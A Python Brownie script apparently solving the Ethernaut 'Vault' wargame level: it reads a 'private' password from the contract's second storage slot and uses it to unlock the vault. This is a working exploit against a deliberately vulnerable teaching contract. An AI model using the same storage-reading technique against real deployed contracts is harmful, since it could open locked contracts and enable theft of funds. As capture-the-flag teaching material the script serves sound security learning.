from scripts.helper.context import *
from scripts.helper.account import _from, acc
from scripts.helper.web3 import web3
from brownie import Vault

##########################################
# Unlock the vault to pass the level!
#########################################

# solve the challenge
def solve_challenge():
    # load challenge
    vault = load_challenge(ContractObject=Vault, instance_key='vault')

    # look at the contract storage's 2nd slot
    # to see the value of the 2nd state variable `password`
    password = web3.eth.getStorageAt(EthernautInstances['vault'], '0x01')

    # what is the password?
    print(web3.toText(password.hex()))

    # unlock the vault
    vault.unlock(password, _from)

    # check if the vault is locked
    locked_assertion = vault.locked() == False
    print(f'Is the vault unlocked? {locked_assertion}')

    return locked_assertion
    
def main():
    solve_challenge()



